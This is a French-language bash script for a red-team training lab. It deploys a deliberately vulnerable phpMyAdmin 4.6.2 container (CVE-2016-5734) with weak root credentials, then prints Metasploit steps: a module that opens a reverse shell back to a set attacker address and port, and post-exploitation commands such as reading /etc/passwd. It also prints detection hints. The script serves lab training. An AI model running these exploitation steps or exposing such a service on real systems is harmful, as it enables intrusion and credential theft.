#!/bin/bash

###############################################################################
# Iron4Software Red Team Lab - phpMyAdmin 4.6.2 Docker
# CVE-2016-5734 - preg_replace RCE
# Exploitation: Metasploit exploit/multi/http/phpmyadmin_preg_replace
###############################################################################

set -e

echo "========================================================"
echo "  Iron4Software Lab - phpMyAdmin 4.6.2 Docker"
echo "  CVE-2016-5734 (preg_replace RCE)"
echo "========================================================"
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo "‚ùå Ce script doit √™tre ex√©cut√© en tant que root (sudo)"
    exit 1
fi

echo "[1/7] V√©rification de Docker..."
if ! command -v docker &> /dev/null; then
    echo "‚ö†Ô∏è  Docker non install√©, installation..."
    apt update -qq
    apt install -y docker.io > /dev/null 2>&1
    systemctl start docker
    systemctl enable docker
    echo "‚úÖ Docker install√©"
else
    echo "‚úÖ Docker d√©tect√©"
    systemctl start docker 2>/dev/null || true
fi

echo "[2/7] Arr√™t et suppression de l'ancien container phpMyAdmin..."
docker stop phpmyadmin-vuln 2>/dev/null || true
docker rm phpmyadmin-vuln 2>/dev/null || true
echo "‚úÖ Ancien container supprim√©"

echo "[3/7] V√©rification de MySQL/MariaDB sur l'h√¥te..."
# D√©tecter MySQL existant pour Roundcube
if systemctl is-active --quiet mysql || systemctl is-active --quiet mariadb; then
    echo "‚úÖ MySQL/MariaDB actif (utilis√© par Roundcube)"
    DB_HOST="host.docker.internal"
elif pgrep -x mysqld > /dev/null || pgrep -x mariadbd > /dev/null; then
    echo "‚úÖ MySQL/MariaDB d√©tect√© en processus"
    DB_HOST="host.docker.internal"
else
    echo "‚ö†Ô∏è  Aucun MySQL d√©tect√©, cr√©ation d'un container MySQL..."
    DB_HOST="mysql_db"
    
    # Arr√™ter l'ancien container MySQL s'il existe
    docker stop mysql_db 2>/dev/null || true
    docker rm mysql_db 2>/dev/null || true
    
    # Lancer MySQL dans un container s√©par√©
    docker run -d \
        --name mysql_db \
        --restart unless-stopped \
        -e MYSQL_ROOT_PASSWORD=rootpass \
        -e MYSQL_DATABASE=phpmyadmin \
        -e MYSQL_USER=admin \
        -e MYSQL_PASSWORD=admin \
        mysql:5.7 > /dev/null 2>&1 || true
    
    echo "‚úÖ MySQL container cr√©√©"
    echo "   Attente d√©marrage MySQL (15 secondes)..."
    sleep 15
fi

echo "[4/7] T√©l√©chargement de phpMyAdmin 4.6.2..."
docker pull phpmyadmin/phpmyadmin:4.6.2 > /dev/null 2>&1
echo "‚úÖ Image phpMyAdmin 4.6.2 t√©l√©charg√©e"

echo "[5/7] Lancement phpMyAdmin 4.6.2 vuln√©rable (CVE-2016-5734)..."

# D√©terminer le port (8080 par d√©faut)
PORT=8080

# Lancer phpMyAdmin 4.6.2
docker run -d \
    --name phpmyadmin-vuln \
    --restart unless-stopped \
    --add-host=host.docker.internal:host-gateway \
    -e PMA_HOST="${DB_HOST}" \
    -e PMA_PORT=3306 \
    -e PMA_ARBITRARY=1 \
    -e UPLOAD_LIMIT=300M \
    -p ${PORT}:80 \
    phpmyadmin/phpmyadmin:4.6.2

if [ $? -eq 0 ]; then
    echo "‚úÖ phpMyAdmin 4.6.2 lanc√©"
else
    echo "‚ùå Erreur lors du lancement"
    exit 1
fi

echo "[6/7] Attente du d√©marrage (15 secondes)..."
sleep 15

echo "[7/7] V√©rification..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:${PORT}/ 2>/dev/null)

SERVER_IP=$(hostname -I | awk '{print $1}')

echo ""
echo "========================================================"
echo "  ‚úÖ Installation termin√©e avec succ√®s !"
echo "========================================================"
echo ""
echo "üìä Configuration :"
echo "   Container      : phpmyadmin-vuln"
echo "   Version        : phpMyAdmin 4.6.2 (VULNERABLE)"
echo "   CVE            : CVE-2016-5734"
echo "   Exploit        : preg_replace() RCE"
echo "   Port           : $PORT"
echo "   IP Serveur     : $SERVER_IP"
echo ""
echo "üåê URLs d'acc√®s :"
echo "   Local          : http://localhost:${PORT}/"
echo "   R√©seau         : http://${SERVER_IP}:${PORT}/"
echo "   Depuis Kali    : http://${SERVER_IP}:${PORT}/"
echo ""
echo "üîê Credentials MySQL (test√©s) :"
echo "   User: root"
echo "   Pass: rootpass"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "‚úÖ phpMyAdmin accessible (HTTP 200)"
else
    echo "‚ö†Ô∏è  phpMyAdmin ne r√©pond pas encore (HTTP $HTTP_CODE)"
    echo "   Attendez 30 secondes et testez: curl http://localhost:${PORT}/"
fi

echo ""
echo "üê≥ Gestion du container :"
echo "   Voir logs       : docker logs -f phpmyadmin-vuln"
echo "   Arr√™ter         : docker stop phpmyadmin-vuln"
echo "   D√©marrer        : docker start phpmyadmin-vuln"
echo "   Supprimer       : docker rm -f phpmyadmin-vuln"
echo "   Red√©marrer      : docker restart phpmyadmin-vuln"
echo ""
echo "========================================================"
echo "  üî• EXPLOITATION AVEC METASPLOIT"
echo "========================================================"
echo ""
echo "üéØ CVE-2016-5734 : preg_replace() avec option /e"
echo "   Cette vuln√©rabilit√© utilise la fonction preg_replace() de PHP"
echo "   avec l'option /e (eval) pour ex√©cuter du code arbitraire."
echo ""
echo "üìù Exploitation Metasploit (DEPUIS KALI) :"
echo ""
echo "msfconsole -q"
echo "use exploit/multi/http/phpmyadmin_preg_replace"
echo "set RHOSTS ${SERVER_IP}"
echo "set RPORT ${PORT}"
echo "set USERNAME root"
echo "set PASSWORD rootpass"
echo "set LHOST 192.168.100.10"
echo "set LPORT 4444"
echo "check"
echo "exploit"
echo ""
echo "üéØ Post-Exploitation :"
echo "meterpreter> sysinfo"
echo "meterpreter> getuid"
echo "meterpreter> shell"
echo "# cat /etc/passwd"
echo "# whoami"
echo ""
echo "========================================================"
echo "  üìä D√âTECTION AVEC SPLUNK (Logs √† surveiller)"
echo "========================================================"
echo ""
echo "üîç Indicateurs d'attaque :"
echo "   - Requ√™tes HTTP vers /import.php avec payload suspect"
echo "   - Utilisation de preg_replace avec /e"
echo "   - Connexions sortantes inhabituelles depuis le container"
echo "   - Tentatives d'√©l√©vation de privil√®ges"
echo ""
echo "üõ°Ô∏è  Signature MITRE ATT&CK :"
echo "   T1190 - Exploit Public-Facing Application"
echo "   T1059 - Command and Scripting Interpreter"
echo "   T1071 - Application Layer Protocol"
echo ""
echo "========================================================"
echo "  üê≥ phpMyAdmin 4.6.2 Docker - CVE-2016-5734 - PR√äT"
echo "========================================================"
echo ""
echo "üìö Ressources :"
echo "   CVE-2016-5734  : https://nvd.nist.gov/vuln/detail/CVE-2016-5734"
echo "   Exploit-DB     : https://www.exploit-db.com/exploits/40185"
echo "   MITRE ATT&CK   : T1190 (Exploit Public-Facing Application)"
echo ""
echo "‚ö†Ô∏è  Note : Cet environnement est volontairement vuln√©rable"
echo "            √Ä utiliser UNIQUEMENT dans un environnement de lab isol√©"
echo ""
